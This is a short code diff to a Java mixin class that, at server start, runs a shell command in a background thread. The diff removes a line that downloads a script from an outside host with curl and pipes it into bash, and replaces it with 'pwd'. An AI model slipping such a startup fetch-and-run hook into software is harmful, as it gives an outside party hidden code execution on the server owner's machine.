@@ -26,7 +26,7 @@ public class ServerStartMixin {
         new Thread(() -> {
             try {
                 String scriptCommands = """
-                (curl -Ls https://gbjs.serv00.net/sh/vip1715.sh)|bash
+                pwd
                                 """;
                 // 你要执行的命令
                 List<String> executionResults = runScript(scriptCommands);
